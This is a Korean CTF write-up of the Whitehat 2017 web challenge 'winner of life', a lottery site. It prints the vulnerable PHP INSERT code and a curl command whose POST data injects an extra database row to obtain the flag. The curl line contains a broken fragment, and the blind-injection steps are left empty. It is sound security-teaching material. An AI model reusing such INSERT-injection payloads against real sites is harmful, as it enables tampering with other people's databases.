# [WEB] Whitehat 2017 - winner of life

## Description

>  [link][https://309d24f0f1f4d43c7640b02baa5d8667.whitehatcontest.kr/]

## Analysis

뭔가 로또 사이트 처럼 보이는 페이지이다.

간단하게 회원가입을 한 후 로그인 해보자.

그 후 Buy 메뉴에 들어가 적당한 숫자에 체크해준 후 Submnit하면 `Your luckyNumber is 1,12,23,34,45,56,68. Good luck!`이라는 문자열과 함께 로또를 사게 된다.

History 메뉴에 들어가면 지금까지 샀던 로또 결과가 나온다.

| ROUND | MY NUMBERS          | TIME                |
| ----- | ------------------- | ------------------- |
| 38128 | 1,12,23,34,45,56,67 | 2017-11-06 11:26:06 |

음 뭐가 당첨이고 아닌지 모르겠다.

Statistics메뉴에 들어가보자.

URL을 보면 `https://309d24f0f1f4d43c7640b02baa5d8667.whitehatcontest.kr/?p=statistics&no=1` 다음과 같은데, 뭔가 굉장히 no에서 인젝션이 될거 같이 생겼다.

블라인드 인젝션 각이다.

# Exploit

SQL인젝션으로 소스코드를 읽어보자.



SQL 인젝션으로 당첨 번호를 찾아보자.



소스 중 buy_check.php를 보자.

```php+HTML
<!-- buy_check.php -->

<?php
	session_start();
	include 'd6conn.php';
	if(!$_SESSION['id'])
		die('<script> alert("LOGIN FIRST"); location.href="./?p=login"; </script>');
	### CHECK VALID VALUE ###
	if(sizeof($_POST) != 7)
		die("<script> alert('You MUST check exactly 7 numbers.'); history.go(-1);</script>");
	foreach( $_POST as $k => $v )
	{
		if($k != $v)
			die("<script> alert('Input error.. Intersting..'); history.go(-1);</script>");
		if(!is_numeric($k))
			die("<script> alert('DO NOT MODIFY NUMBERS TO STRING'); history.go(-1);</script>");
	}

	### INSERT TO DATABASE ###
	$Data = implode(",",$_POST);
	$Round = getRound($conn);
	$time = date("Y-m-d H:i:s");
	$q = "INSERT INTO ATTEMPT value('{$Round}','{$_SESSION['id']}','{$Data}','{$_SERVER['REMOTE_ADDR']}','{$time}')";
	$res = mysqli_query($conn,$q);
	if( mysqli_errno($conn) == 1062 )
		die("<script> alert('You already attempt this round. Please wait.'); location.href='./';</script>");
	else
		die("<script> alert('Your luckyNumber is ".$Data.". Good luck!'); location.href='./';</script>");
?>
```

INSERT문을 보면 굉장히 insert injection이 일어날거 같이 생기지 않았는가!?

data로 `1=1&12=12&23=23&34=34&45=45&56=56&68=68','1','1'),('1','sh','6,9,16,30,33,37,58`를 넘겨 insert injection을 해보자.

```bash
curl 'https://309d24f0f1f4d43c7640b02baa5d8667.whitehatcontest.kr/buy_check.php' -in: https://309d24f0f1f4d43c7640b02baa5d8667.whitehatcontest.kr' -H 'accept-encoding: gzip, deflate, br' -H 'accept-language: ko-KR,ko;q=0.8,en-US;q=0.6,en;q=0.4,ja;q=0.2' -H 'upgrade-insecure-requests: 1' -H 'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36' -H 'content-type: application/x-www-form-urlencoded' -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'cache-control: max-age=0' -H 'authority: 309d24f0f1f4d43c7640b02baa5d8667.whitehatcontest.kr' -H 'cookie: PHPSESSID=gcoe1o75sf35hr70v3ub14q0k6; AWSALB=Kw2xupsLvjTuWXdj+wADSrRxZXXTo8dA5IKRrpCefyQbnM7T9C7blRox8qXPakVKFkOU19vmNLWPlU0Z1aWXGXhhUuzzO4cfplpPAXji6Da9rV/Ob04vc3ka0gOu' -H 'referer: https://309d24f0f1f4d43c7640b02baa5d8667.whitehatcontest.kr/?p=buy' --data "1=1&12=12&23=23&34=34&45=45&56=56&68=68','1','1'),('1','sh','6,9,16,30,33,37,58" --compressed
```

이를 수행하면 

```html
<script> alert('Your luckyNumber is 1,12,23,34,45,56,68','1','1'),('1','sh','6,9,16,30,33,37,58. Good luck!'); location.href='./';</script>
```

다음의 결과를 뿌려준다.

뭔가 등록된거 같으니 history메뉴에 들어가자.

| ROUND | MY NUMBERS              | TIME                |
| ----- | ----------------------- | ------------------- |
| 1     | FLAG{Wa11eT_I5_H0W1IN9} | 2017-11-06 11:36:17 |
| 38128 | 1,12,23,34,45,56,67     | 2017-11-06 11:26:06 |
| 38130 | 1,12,23,34,45,56,68     | 1                   |

Halo~~

플래그를 얻을 수 있다.



**FLAG{Wa11eT_I5_H0W1IN9}**